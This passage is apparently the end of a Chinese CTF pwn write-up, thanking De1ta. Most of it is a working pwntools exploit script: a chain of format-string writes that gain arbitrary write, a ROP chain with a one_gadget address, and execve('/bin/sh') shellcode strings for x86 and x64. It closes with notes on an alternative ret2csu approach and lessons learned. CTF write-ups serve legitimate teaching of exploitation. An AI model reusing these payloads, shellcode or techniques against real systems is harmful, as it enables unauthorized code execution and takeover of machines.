    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    it      = lambda                    :p.interactive()
    uu32    = lambda data   :u32(data.ljust(4, ''))
    uu64    = lambda data   :u64(data.ljust(8, ''))
    bp      = lambda bkp                :pdbg.bp(bkp)
    #elf=pdbg.elf
    #libc=pdbg.libc
    sh_x86_18="x6ax0bx58x53x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
    sh_x86_20="x31xc9x6ax0bx58x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
    sh_x64_21="xf7xe6x50x48xbfx2fx62x69x6ex2fx2fx73x68x57x48x89xe7xb0x3bx0fx05"
    #https://www.exploit-db.com/shellcodes
    #-----------------------------------------------------------------------------------------    def pwn():
        pop_rsp=0x40082d
        ru('This is your gift: ')
        stack=int(ru('n'),16)
        #if stack&0xffff>0x2000:
        #   p.close()
        print hex(stack)
        payload1='%'+str(0x298)+'c'+'%26$hn'
        payload1=payload1.ljust(16,'x00')+p64(0x4007A3)
        sleep(0.1)
        sl(payload1)
        bp([0x4007c1])
        sleep(0.1)
        payload2='%'+str(0xa3)+'c%23$hhn'
        sl(payload2)
        input()
        sleep(0.1)
        stack_tail=(stack-280)&0xff
        payload3='%'+str(0x48)+'c%18$hhn'+'%'+str(0xa3-0x48)+'c%23$hhn'
        sleep(0.1)
        sl(payload3)
        #get arbitray write
        sleep(0.2)
        payload4='%'+str(stack_tail)+'c%18$hhn'+'%'+str(0xa3-stack_tail)+'c%23$hhn'
        sl(payload4)
        sleep(0.1)
        payload5='%13$n'+'%'+str(0xa3)+'c%23$hhn'
        sl(payload5)
        sleep(0.2)
        payload4='%'+str(stack_tail+4)+'c%18$hhn'+'%'+str(0xa3-stack_tail-4)+'c%23$hhn'
        sl(payload4)
        sleep(0.1)
        payload5='%13$n'+'%'+str(0xa3)+'c%23$hhn'
        sl(payload5)  #clear up the first arg
        sleep(0.2)
        payload4='%'+str(stack_tail+4)+'c%18$hhn'+'%'+str(0xa3-stack_tail-4)+'c%23$hhn'
        sl(payload4)
        sleep(0.1)
        payload5='%13$n'+'%'+str(0xa3)+'c%23$hhn'
        sl(payload5)#clear up the first arg
        sleep(0.2) #fake_heap=0x6010a0
        payload4='%'+str(stack_tail)+'c%18$hhn'+'%'+str(0xa3-stack_tail)+'c%23$hhn'
        sl(payload4)
        sleep(0.1)
        payload5='%'+str(0xa3)+'c%23$hhn'+'%'+str(0x10a0-0xa3)+'c%13$hn'
        sl(payload5)
        sleep(0.2) #fake_heap=0x6010a0
        payload4='%'+str(stack_tail+2)+'c%18$hhn'+'%'+str(0xa3-stack_tail-2)+'c%23$hhn'
        sl(payload4)
        sleep(0.1)
        payload5='%'+str(0x60)+'c%13$hhn'+'%'+str(0xa3-0x60)+'c%23$hhn'
        sl(payload5)
        # merge heap and ROP
        prbp = 0x400690 #pop rbp;ret;
        prsp = 0x40082d #pop rsp r13 r14 r15 ;ret
        adc = 0x4006E8  
        '''
        adc    DWORD PTR [rbp+0x48],edx
        mov    ebp,esp
        call   0x400660 
        pop    rbp
        mov    byte ptr [rip + 0x20094e], 1 
        ret
        mov    eax,0x601017
        push   rbp
        sub    rax,0x601010
        cmp    rax,0xe
        mov    rbp,rsp
        jbe    0x400690 
        pop    rbp
        ret   
        '''
        arsp = 0x0400848 #add    rsp,0x8;ret
        prbx = 0x40082A #pop rbx rbp r12 r13 r14 r15;ret
        call = 0x400810 #mov    rdx,r13
                        #mov    rsi,r14
                        #mov    edi,r15d
                        #call   QWORD PTR [r12+rbx*8]
        stderr = 0x601040  #0x7ffff7dd2540
        one= 0x7ffff7afe147#0x7ffff7a52216 0x7ffff7a5226a  0x7ffff7afd2a4 0x7ffff7afe147
        rop=0x6010a0
        payload6 = p64(arsp)*3
        #                   rbx   rbp      r12     r13    r14 r15
        payload6 += flat(prbx,0,stderr-0x48,rop,0xFFD2BC07,0,  0,  call)
        payload6 += flat(adc,0,prbx,0,0,stderr,0,0,0,0x400819)
        sleep(1)
        payload5='%'+str(0x82d)+'c%23$hn'
        payload5=payload5.ljust(0x40,'x00')+payload6
        #bp([0x4007c1])
        sl(payload5)
        it()
    if __name__=='__main__':
        while 1:
            try:
                pwn()
            except:
                p.close()
                p=pdbg.run("local")
## 3\. 补充
在看了[Kirin师傅的wp](https://www.jianshu.com/p/9fc6a4e98ecb)后觉得师傅的思路也非常好，这里记录一下。
前面思路相同，getshell的时候，调用puts在栈上留一个libc中的地址，改一字节得到syscall，再利用ret2csu控制rdi,rsi,rdx,利用read的返回值控制rax，最后调用syscall拿shell。
## 4\. 总结
这是一道非常好的题目，涉面广泛，感谢De1ta。这道题教会了我要充分的重视栈上的数据来达成利用，栈是所有函数调用都会使用到的结构，前面函数执行完之后多少会在栈上留下蛛丝马迹，充分利用它们，也许就能拿shell。再次感谢De1ta。